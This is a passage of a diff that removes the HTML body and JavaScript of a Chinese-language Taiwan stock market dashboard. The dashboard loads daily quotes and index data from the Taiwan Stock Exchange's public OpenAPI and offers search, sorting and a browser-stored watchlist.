-      <div class="metric" id="indexValue">載入中</div>
-      <div id="indexChange" class="status">等待大盤資料</div>
-    </section>
-    <section class="panel">
-      <div class="muted">取得股票數量</div>
-      <div class="metric" id="stockCount">--</div>
-      <div class="status">目前載入的有效個股</div>
-    </section>
-    <section class="panel">
-      <div class="muted">上漲家數</div>
-      <div class="metric up" id="upCount">--</div>
-      <div class="status">依可用漲跌價差統計</div>
-    </section>
-    <section class="panel">
-      <div class="muted">下跌家數</div>
-      <div class="metric down" id="downCount">--</div>
-      <div class="status">依可用漲跌價差統計</div>
-    </section>
-  </div>
-
-  <section class="panel">
-    <h2>市場狀態</h2>
-    <div class="summary-line">
-      <span id="connectionStatus" class="pill warn">準備載入</span>
-      <span id="marketDate" class="status">行情日期：未知</span>
-    </div>
-    <p id="marketSummary">正在準備市場資料。</p>
-    <p id="updateTime" class="status">讀取時間：尚未更新</p>
-    <p id="dataStatus" class="status" role="status" aria-live="polite">
-      正在連線至公開行情 API……
-    </p>
-  </section>
-
-  <section class="panel">
-    <h2>個股行情</h2>
-    <div class="toolbar">
-      <input id="searchInput" type="search" placeholder="搜尋代碼或名稱，例如 2330" aria-label="搜尋股票">
-      <select id="sortSelect" aria-label="排序方式">
-        <option value="volume">成交量由高至低</option>
-        <option value="change">漲幅由高至低</option>
-        <option value="changeDown">跌幅由大至小</option>
-        <option value="code">依代碼排序</option>
-      </select>
-      <button id="watchFilter" class="secondary">只看自選股票</button>
-    </div>
-
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>代碼</th><th>名稱</th><th>收盤價</th>
-            <th>漲跌</th><th>成交量（股）</th><th>自選</th><th>查詢</th>
-          </tr>
-        </thead>
-        <tbody id="stockTable">
-          <tr><td colspan="7" class="empty">正在載入個股資料……</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <div class="toolbar" style="margin-top:15px">
-      <button id="loadMoreBtn" class="secondary" hidden>顯示更多</button>
-    </div>
-    <p id="tableStatus" class="status">尚未取得股票資料。</p>
-  </section>
-
-  <section class="panel">
-    <h2>自選觀察清單</h2>
-    <p class="muted">自選清單保存在目前瀏覽器，不會自動同步到其他裝置。</p>
-    <div id="watchList" class="watch-grid">
-      <div class="empty">尚未加入股票。</div>
-    </div>
-    <p id="watchStatus" class="status" role="status" aria-live="polite"></p>
-  </section>
-</main>
-
-<footer>
-  資料來源：
-  <a class="link" href="https://openapi.twse.com.tw/" target="_blank" rel="noopener noreferrer">臺灣證券交易所 OpenAPI</a><br>
-  個股：
-  <a class="link" href="https://openapi.twse.com.tw/v1/exchangeReport/STOCK_DAY_ALL" target="_blank" rel="noopener noreferrer">上市個股日成交資訊</a><br>
-  大盤：
-  <a class="link" href="https://openapi.twse.com.tw/v1/exchangeReport/MI_INDEX" target="_blank" rel="noopener noreferrer">每日收盤行情－大盤統計資訊</a><br>
-  顯示的資料日期以來源回傳為準。快取資料不代表即時行情。
-</footer>
-
-<script>
-"use strict";
-
-const CONFIG = {
-  stockAPI: "https://openapi.twse.com.tw/v1/exchangeReport/STOCK_DAY_ALL",
-  indexAPI: "https://openapi.twse.com.tw/v1/exchangeReport/MI_INDEX",
-  watchKey: "twStockWatch",
-  cacheKey: "twStockCache",
-  timeout: 15000,
-  retryCount: 1,
-  initialRows: 50,
-  pageSize: 50,
-  maxCacheAge: 7 * 24 * 60 * 60 * 1000
-};
-
-const $ = id => document.getElementById(id);
-
-const state = {
-  stocks: [],
-  indexRows: [],
-  watchSet: new Set(),
-  watchOnly: false,
-  visibleRows: CONFIG.initialRows,
-  loading: false,
-  lastUpdated: null,
-  dataDate: null,
-  dataSource: "none"
-};
-
-function field(row, names) {
-  if (!row || typeof row !== "object") return "";
-  for (const name of names) {
-    const value = row[name];
-    if (value !== undefined && value !== null && String(value).trim() !== "") {
-      return value;
-    }
-  }
-  return "";
-}
-
-function number(value) {
-  if (value === null || value === undefined) return NaN;
-  const s = String(value).trim().replace(/,/g, "");
-  if (!s || ["--", "-", "X", "N/A"].includes(s)) return NaN;
-  if (s.endsWith("%") || s.endsWith("％")) return NaN;
-  const n = Number(s);
-  return Number.isFinite(n) ? n : NaN;
-}
-
-function fmt(value, digits = 2) {
-  return Number.isFinite(value)
-    ? value.toLocaleString("zh-TW", {
-        minimumFractionDigits: digits,
-        maximumFractionDigits: digits
-      })
-    : "--";
-}
-
-function signed(value, digits = 2) {
-  if (!Number.isFinite(value)) return "--";
-  return (value > 0 ? "+" : "") + fmt(value, digits);
-}
-
-function safeText(value) {
-  return String(value).replace(/[&<>"']/g, c => ({
-    "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;"
-  })[c]);
-}
-
-function codeOf(row) {
-  return String(field(row, ["Code", "證券代號", "股票代號"])).trim();
-}
-
-function nameOf(row) {
-  return String(field(row, ["Name", "證券名稱", "股票名稱"])).trim();
-}
-
-function priceOf(row) {
-  return number(field(row, ["ClosingPrice", "收盤價", "Close"]));
-}
-
-function volumeOf(row) {
-  return number(field(row, ["TradeVolume", "成交股數", "成交量"]));
-}
-
-function changeOf(row) {
-  const raw = field(row, ["Change", "漲跌價差"]);
-  let n = number(raw);
-  if (!Number.isFinite(n)) return NaN;
-
-  const direction = String(field(row, ["漲跌(+/-)", "漲跌符號", "漲跌方向"])).trim();
-
-  if (direction === "-") n = -Math.abs(n);
-  if (direction === "+") n = Math.abs(n);
-
-  return n;
-}
-
-function percentOf(row) {
-  const close = priceOf(row);
-  const change = changeOf(row);
-  if (!Number.isFinite(close) || !Number.isFinite(change)) return NaN;
-
-  const previous = close - change;
-  return previous > 0 ? change / previous * 100 : NaN;
-}
-
-function colorOf(value) {
-  if (!Number.isFinite(value) || value === 0) return "neutral";
-  return value > 0 ? "up" : "down";
-}
-
-function normalizeStocks(rows) {
-  if (!Array.isArray(rows)) return [];
-  return rows.filter(row =>
-    row && typeof row === "object" &&
-    /^\d{4,6}[A-Z]?$/.test(codeOf(row)) &&
-    nameOf(row).length > 0
-  );
-}
-
-function setConnection(text, type = "warn") {
-  $("connectionStatus").textContent = text;
-  $("connectionStatus").className = "pill " + type;
-}
-
-function loadWatchList() {
-  try {
-    const data = JSON.parse(localStorage.getItem(CONFIG.watchKey) || "[]");
-    return new Set(Array.isArray(data)
-      ? data.filter(x => typeof x === "string" && /^\d{4,6}[A-Z]?$/.test(x))
-      : []);
-  } catch {
-    return new Set();
-  }
-}
-
-function saveWatchList() {
-  try {
-    localStorage.setItem(CONFIG.watchKey, JSON.stringify([...state.watchSet]));
-  } catch {
-    $("watchStatus").textContent = "無法儲存自選清單，請檢查瀏覽器儲存空間。";
-  }
-}
-
-function saveCache() {
-  try {
-    localStorage.setItem(CONFIG.cacheKey, JSON.stringify({
-      savedAt: Date.now(),
-      stocks: state.stocks,
-      indexRows: state.indexRows,
-      dataDate: state.dataDate
-    }));
-  } catch (error) {
-    console.warn("快取儲存失敗", error);
-  }
-}
-
-function loadCache() {
-  try {
-    const c = JSON.parse(localStorage.getItem(CONFIG.cacheKey) || "null");
-    if (!c || !Array.isArray(c.stocks) || !Number.isFinite(c.savedAt)) return false;
-    if (Date.now() - c.savedAt > CONFIG.maxCacheAge) return false;
-
-    state.stocks = normalizeStocks(c.stocks);
-    state.indexRows = Array.isArray(c.indexRows) ? c.indexRows : [];
-    state.dataDate = c.dataDate || null;
-    state.lastUpdated = c.savedAt;
-    state.dataSource = "cache";
-    return state.stocks.length > 0;
-  } catch {
-    return false;
-  }
-}
-
-async function fetchJSON(url) {
-  let lastError;
-
-  for (let attempt = 0; attempt <= CONFIG.retryCount; attempt++) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), CONFIG.timeout);
-
-    try {
-      const response = await fetch(url, {
-        method: "GET",
-        cache: "no-store",
-        headers: { Accept: "application/json" },
-        signal: controller.signal
-      });
-
-      if (!response.ok) {
-        throw new Error("HTTP " + response.status);
-      }
-
-      const data = await response.json();
-
-      if (!Array.isArray(data)) {
-        throw new Error("API 回傳格式不是預期的陣列");
-      }
-
-      return data;
-    } catch (error) {
-      lastError = error.name === "AbortError"
-        ? new Error("請求逾時（超過 " + CONFIG.timeout / 1000 + " 秒）")
-        : error;
-
-      if (attempt < CONFIG.retryCount) {
-        await new Promise(resolve => setTimeout(resolve, 800));
-      }
-    } finally {
-      clearTimeout(timer);
-    }
-  }
-
-  if (lastError instanceof TypeError) {
-    throw new Error("瀏覽器無法連線或跨來源請求遭阻擋（Failed to fetch）");
-  }
-
-  throw lastError || new Error("未知連線錯誤");
-}
-
-function dateOfStocks(rows) {
-  if (!Array.isArray(rows) || !rows.length) return null;
-  const d = field(rows[0], ["Date", "日期", "資料日期", "交易日期"]);
-  return d ? String(d).trim() : null;
-}
-
-function parseROCDate(value) {
-  const s = String(value || "").trim();
-  const m = s.match(/^(\d{3})(\d{2})(\d{2})$/);
-  if (!m) return s || null;
-  return `${Number(m[1]) + 1911}-${m[2]}-${m[3]}`;
-}
-
-async function loadMarket() {
-  if (state.loading) return;
-
-  state.loading = true;
-  $("refreshBtn").disabled = true;
-  $("refreshBtn").textContent = "載入中……";
-  setConnection("正在連線", "warn");
-  $("dataStatus").textContent = "正在讀取個股及大盤公開資料……";
-
-  const stockPromise = fetchJSON(CONFIG.stockAPI);
-  const indexPromise = fetchJSON(CONFIG.indexAPI);
-
-  const [stockResult, indexResult] = await Promise.allSettled([
-    stockPromise, indexPromise
-  ]);
-
-  let stockUpdated = false;
-  let indexUpdated = false;
-  const errors = [];
-
-  if (stockResult.status === "fulfilled") {
-    const list = normalizeStocks(stockResult.value);
-    if (list.length) {
-      state.stocks = list;
-      state.dataDate = dateOfStocks(stockResult.value);
-      state.lastUpdated = Date.now();
-      state.dataSource = "live";
-      stockUpdated = true;
-    } else {
-      errors.push("個股 API 沒有可辨識的股票資料");
-    }
-  } else {
-    errors.push("個股：" + stockResult.reason.message);
-  }
-
-  if (indexResult.status === "fulfilled") {
-    state.indexRows = indexResult.value;
-    indexUpdated = true;
-  } else {
-    errors.push("大盤：" + indexResult.reason.message);
-  }
-
-  if (stockUpdated || indexUpdated) saveCache();
-
-  renderAll();
-
-  if (stockUpdated && indexUpdated) {
-    setConnection("個股與大盤已取得", "ok");
-    $("dataStatus").textContent =
-      "個股與大盤資料已取得。請以行情日期確認資料所屬交易日。";
-  } else if (stockUpdated || indexUpdated) {
-    setConnection("部分資料已取得", "warn");
-    $("dataStatus").textContent =
-      "部分資料成功，部分資料失敗：" + errors.join("；");
-  } else if (state.stocks.length || state.indexRows.length) {
-    setConnection("顯示已保存資料", "warn");
-    $("dataStatus").textContent =
-      "即時更新失敗：" + errors.join("；") +
-      "。目前保留先前畫面資料，請留意資料日期。";
-  } else {
-    const hasCache = loadCache();
-    renderAll();
-    if (hasCache) {
-      setConnection("使用本機快取", "warn");
-      $("dataStatus").textContent =
-        "即時連線失敗，已顯示本機快取。原因：" + errors.join("；");
-    } else {
-      setConnection("連線失敗", "error");
-      $("dataStatus").textContent =
-        "無法取得即時或快取資料：" + errors.join("；") +
-        "。請確認網路，或稍後再試。";
-    }
-  }
-
-  state.loading = false;
-  $("refreshBtn").disabled = false;
-  $("refreshBtn").textContent = "重新載入行情";
-}
-
-function indexRowOf() {
-  return state.indexRows.find(row =>
-    String(field(row, ["指數", "指數名稱", "名稱"])).includes("發行量加權")
-  ) || state.indexRows.find(row =>
-    String(field(row, ["指數", "指數名稱", "名稱"])).includes("加權指數")
-  ) || null;
-}
-
-function renderIndex() {
-  const row = indexRowOf();
-
-  if (!row) {
-    $("indexValue").textContent = "--";
-    $("indexChange").textContent = "目前沒有可辨識的大盤指數";
-    $("indexChange").className = "status neutral";
-    return;
-  }
-
-  const close = number(field(row, ["收盤指數", "收盤價", "指數值"]));
-  const points = number(field(row, ["漲跌點數", "漲跌點"]));
-
-  // MI_INDEX 的「漲跌」欄位是方向符號，不是漲跌點數。
-  const direction = String(field(row, ["漲跌", "漲跌(+/-)", "漲跌符號"])).trim();
-  let change = points;
-
-  if (Number.isFinite(change)) {
-    if (direction === "-") change = -Math.abs(change);
-    else if (direction === "+") change = Math.abs(change);
-  }
-
-  $("indexValue").textContent = fmt(close);
-  $("indexChange").className = "status " + colorOf(change);
-  $("indexChange").textContent = Number.isFinite(change)
-    ? `${signed(change)} 點`
-    : "大盤漲跌點數尚未取得";
-}
-
-function renderSummary() {
-  $("stockCount").textContent = state.stocks.length.toLocaleString("zh-TW");
-
-  let up = 0, down = 0, flat = 0, unknown = 0;
-
-  for (const stock of state.stocks) {
-    const n = changeOf(stock);
-    if (!Number.isFinite(n)) unknown++;
-    else if (n > 0) up++;
-    else if (n < 0) down++;
-    else flat++;
-  }
-
-  $("upCount").textContent = up.toLocaleString("zh-TW");
-  $("downCount").textContent = down.toLocaleString("zh-TW");
-
-  $("marketSummary").textContent =
-    `上漲 ${up} 檔、下跌 ${down} 檔、平盤 ${flat} 檔；` +
-    `${unknown} 檔缺少有效漲跌價差。` +
-    (up > down ? "上漲家數較多。" : down > up ? "下跌家數較多。" : "上漲與下跌家數相同。");
-}
-
-function compare(a, b, direction = "desc") {
-  const va = Number.isFinite(a), vb = Number.isFinite(b);
-  if (!va && !vb) return 0;
-  if (!va) return 1;
-  if (!vb) return -1;
-  return direction === "asc" ? a - b : b - a;
-}
-
-function filteredStocks() {
-  const keyword = $("searchInput").value.trim().toLowerCase();
-  const sort = $("sortSelect").value;
-
-  const list = state.stocks.filter(stock => {
-    const code = codeOf(stock).toLowerCase();
-    const name = nameOf(stock).toLowerCase();
-    return (code.includes(keyword) || name.includes(keyword)) &&
-      (!state.watchOnly || state.watchSet.has(codeOf(stock)));
-  });
-
-  list.sort((a, b) => {
-    if (sort === "volume") return compare(volumeOf(a), volumeOf(b));
-    if (sort === "change") return compare(percentOf(a), percentOf(b));
-    if (sort === "changeDown") return compare(percentOf(a), percentOf(b), "asc");
-    return codeOf(a).localeCompare(codeOf(b), "zh-TW");
-  });
-
-  return list;
-}
-
-function queryURL(code) {
-  return "https://www.twse.com.tw/zh/trading/historical/stock-day.html?stockNo=" +
-    encodeURIComponent(code);
-}
-
-function renderStocks() {
-  const list = filteredStocks();
-  const rows = list.slice(0, state.visibleRows);
-
-  $("stockTable").innerHTML = rows.length ? rows.map(stock => {
-    const code = codeOf(stock);
-    const name = nameOf(stock);
-    const price = priceOf(stock);
-    const change = changeOf(stock);
-    const percent = percentOf(stock);
-    const volume = volumeOf(stock);
-    const watched = state.watchSet.has(code);
-    const cls = colorOf(change);
-
-    return `<tr>
-      <td class="code">${safeText(code)}</td>
-      <td>${safeText(name)}</td>
-      <td>${fmt(price)}</td>
-      <td class="${cls}">${safeText(signed(change))}
-        <small> (${Number.isFinite(percent) ? safeText(signed(percent)) + "%" : "--"})</small>
-      </td>
-      <td>${fmt(volume, 0)}</td>
-      <td><button class="secondary" data-watch="${safeText(code)}">${watched ? "移除" : "＋觀察"}</button></td>
-      <td><a class="link" href="${queryURL(code)}" target="_blank" rel="noopener noreferrer">查詢</a></td>
-    </tr>`;
-  }).join("") : '<tr><td colspan="7" class="empty">沒有符合條件的股票。</td></tr>';
-
-  $("tableStatus").textContent =
-    `符合條件 ${list.length} 檔，目前顯示 ${rows.length} 檔。`;
-  $("loadMoreBtn").hidden = rows.length >= list.length;
-
-  renderWatchList();
-}
-
-function renderWatchList() {
-  const codes = [...state.watchSet];
-
-  $("watchList").innerHTML = codes.length ? codes.map(code => {
-    const stock = state.stocks.find(s => codeOf(s) === code);
-    const name = stock ? nameOf(stock) : "尚無行情資料";
-    const price = stock ? priceOf(stock) : NaN;
-    const change = stock ? changeOf(stock) : NaN;
-    const percent = stock ? percentOf(stock) : NaN;
-
-    return `<article class="watch-card">
-      <div class="summary-line">
-        <strong class="code">${safeText(code)}</strong>
-        <span>${safeText(name)}</span>
-      </div>
-      <div class="metric">${fmt(price)}</div>
-      <div class="${colorOf(change)}">${safeText(signed(change))}
-        (${Number.isFinite(percent) ? safeText(signed(percent)) + "%" : "--"})
-      </div>
-      <button class="secondary" data-watch="${safeText(code)}">移除自選</button>
-    </article>`;
-  }).join("") : '<div class="empty">尚未加入股票。</div>';
-
-  $("watchFilter").textContent = state.watchOnly ? "顯示全部股票" : "只看自選股票";
-}
-
-function renderTime() {
-  $("marketDate").textContent =
-    "行情日期：" + (parseROCDate(state.dataDate) || "來源未提供日期");
-
-  $("updateTime").textContent = state.lastUpdated
-    ? "本機讀取時間：" + new Date(state.lastUpdated).toLocaleString("zh-TW") +
-      (state.dataSource === "cache" ? "（快取時間）" : "")
-    : "本機讀取時間：尚未更新";
-}
-
-function renderAll() {
-  renderIndex();
-  renderSummary();
-  renderStocks();
-  renderTime();
-}
-
-function toggleWatch(code) {
-  if (state.watchSet.has(code)) {
-    state.watchSet.delete(code);
-    $("watchStatus").textContent = `已移除 ${code}。`;
-  } else {
-    state.watchSet.add(code);
-    $("watchStatus").textContent = `已加入 ${code}。`;
-  }
-  saveWatchList();
-  renderStocks();
-}
-
-document.addEventListener("click", event => {
-  const target = event.target;
-  if (!(target instanceof Element)) return;
-  const button = target.closest("[data-watch]");
-  if (button) toggleWatch(button.dataset.watch);
-});
-
-$("searchInput").addEventListener("input", () => {
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
-
-$("sortSelect").addEventListener("change", () => {
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
-
-$("watchFilter").addEventListener("click", () => {
-  state.watchOnly = !state.watchOnly;
-  state.visibleRows = CONFIG.initialRows;
-  renderStocks();
-});
-
-$("loadMoreBtn").addEventListener("click", () => {
-  state.visibleRows += CONFIG.pageSize;
-  renderStocks();
-});
-
-$("refreshBtn").addEventListener("click", loadMarket);
-
-async function init() {
-  state.watchSet = loadWatchList();
-
-  if (loadCache()) {
-    renderAll();
-    setConnection("先顯示已保存資料", "warn");
-    $("dataStatus").textContent = "目前顯示本機保存的資料，正在嘗試更新行情。";
-  }
-
-  await loadMarket();
-}
-
-init();
-</script>
 </body>
 </html>
